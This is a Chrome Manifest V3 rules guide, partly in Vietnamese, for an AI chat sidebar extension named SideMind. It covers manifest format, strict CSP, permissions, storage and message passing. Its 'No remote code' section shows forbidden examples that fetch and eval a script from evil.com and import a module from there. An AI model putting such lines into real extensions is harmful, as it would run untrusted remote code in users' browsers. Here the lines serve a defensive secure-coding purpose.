# Chrome MV3 Rules

## 1. Manifest V3 only — không dùng MV2

```json
{
  "manifest_version": 3,
  "name": "SideMind",
  "version": "0.1.0",
  "description": "AI chat sidebar with context awareness"
}
```

KHÔNG:
- `background.scripts` (MV2) → dùng `background.service_worker` (MV3).
- `browser_action` / `page_action` → dùng `action`.
- Persistent background page → dùng Service Worker (event-driven, tự terminate).
- `web_accessible_resources` không có entry type.

## 2. CSP nghiêm ngặt

```json
{
  "content_security_policy": {
    "extension_pages": "script-src 'self'; object-src 'self'",
    "sandbox": "sandbox allow-scripts allow-forms"
  }
}
```

KHÔNG:
- `unsafe-inline` trong script-src.
- `unsafe-eval` trong bất kỳ context nào.
- `script-src 'self' 'unsafe-eval'` — Chrome Web Store sẽ reject.
- Wildcard `*` trong script-src.

## 3. Permissions — tối thiểu

### Quy tắc
- **MUST** justify mỗi permission trong Phụ lục B SRS trước khi khai báo.
- **AVOID** `<all_urls>` — chỉ dùng khi content script cần access mọi trang (SideMind có vì context extraction).
- **PREFER** `optional_host_permissions` + runtime request khi có thể.

### Permissions chuẩn của SideMind
```json
{
  "permissions": [
    "sidePanel",
    "storage",
    "activeTab",
    "scripting",
    "contextMenus",
    "tabs",
    "commands"
  ],
  "host_permissions": [
    "https://api.openai.com/*",
    "https://api.anthropic.com/*",
    "https://generativelanguage.googleapis.com/*",
    "https://www.youtube.com/*"
  ]
}
```

## 4. No remote code

```typescript
// ❌ NEVER
const script = await fetch('https://evil.com/script.js').then(r => r.text());
eval(script);

// ❌ NEVER
const module = await import('https://evil.com/module.js');

// ❌ NEVER
new Function('return ' + dynamicCode)();
```

Mọi JavaScript phải đóng gói trong extension package (`dist/`). Runtime chỉ được load code local qua `chrome.runtime.getURL()`.

## 5. Network requests — host_permissions

Mọi `fetch()`, `XMLHttpRequest`, hoặc WebSocket connection phải tới domain đã khai báo trong `host_permissions`. SideMind chỉ gọi:

| Domain | Mục đích |
|---|---|
| `api.openai.com` | OpenAI Chat Completions |
| `api.anthropic.com` | Anthropic Messages |
| `generativelanguage.googleapis.com` | Gemini API |
| `www.youtube.com` | YouTube timedtext |

Nếu cần thêm domain → update manifest + Phụ lục B SRS + Phụ lục C open issues.

## 6. Storage boundaries

```typescript
// chrome.storage.local — persistent, ~10MB quota
await chrome.storage.local.set({ settings });

// chrome.storage.session — in-memory, cleared khi browser restart
await chrome.storage.session.set({ ephemeralState });

// IndexedDB — cho data lớn (ContextCache, Conversation history)
await openDB('sidemind', 1, { upgrade(db) { db.createObjectStore('conversations'); } });
```

Quy tắc:
- Settings, API key (encrypted), conversation metadata → `chrome.storage.local`.
- Service worker state tạm → `chrome.storage.session`.
- Context cache, conversation content lớn → IndexedDB.
- File binary (FR-12) → **CHỈ giữ trong memory**, không persist.

## 7. Message passing

### One-shot request/response
```typescript
// Side Panel → Service Worker
const result = await chrome.runtime.sendMessage({ type: 'getSettings' });

// Service Worker handler
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg.type === 'getSettings') {
    handleGetSettings().then(sendResponse);
    return true;  // async response
  }
});
```

### Long-lived port (streaming)
```typescript
// Service Worker
chrome.runtime.onConnect.addListener((port) => {
  if (port.name === 'chat-stream') {
    port.onMessage.addListener(async (msg) => {
      for await (const chunk of aiAdapter.stream(msg)) {
        port.postMessage({ type: 'chunk', data: chunk });
      }
      port.postMessage({ type: 'done' });
    });
  }
});

// Side Panel
const port = chrome.runtime.connect({ name: 'chat-stream' });
port.postMessage({ type: 'chat', messages });
port.onMessage.addListener((msg) => {
  if (msg.type === 'chunk') appendChunk(msg.data);
  if (msg.type === 'done') finishStream();
});
```

## 8. Side Panel best practices

```typescript
// manifest.json
{
  "side_panel": {
    "default_path": "sidepanel.html"
  },
  "permissions": ["sidePanel"]
}

// Set behavior per-tab
await chrome.sidePanel.setOptions({
  tabId,
  path: 'sidepanel.html',
  enabled: true
});

// Open programmatically
await chrome.sidePanel.open({ tabId });
```

## 9. Content Script isolation

```typescript
// Content script KHÔNG đụng page CSS/JS variables
// Dùng Shadow DOM cho FAB injection
class FABController {
  private host = document.createElement('div');
  private shadow = this.host.attachShadow({ mode: 'open' });

  inject() {
    document.body.appendChild(this.host);
    // Render vào this.shadow, không vào document
  }
}
```

## 10. Service Worker resilience

- Service Worker có thể bị Chrome terminate bất kỳ lúc nào (sau 30s idle).
- Persist state quan trọng qua `chrome.storage.session` ngay khi thay đổi.
- Re-entrant code: handler phải idempotent.

## 11. Khi review / submit Chrome Web Store

Checklist:
- [ ] CSP strict, no inline scripts.
- [ ] Permission justification đầy đủ cho mỗi permission trong store listing.
- [ ] Demo video giải thích `<all_urls>` usage.
- [ ] Privacy policy URL accessible.
- [ ] Icon đầy đủ sizes: 16, 32, 48, 128.
- [ ] Bundle unpacked < 5MB (NFR-01).
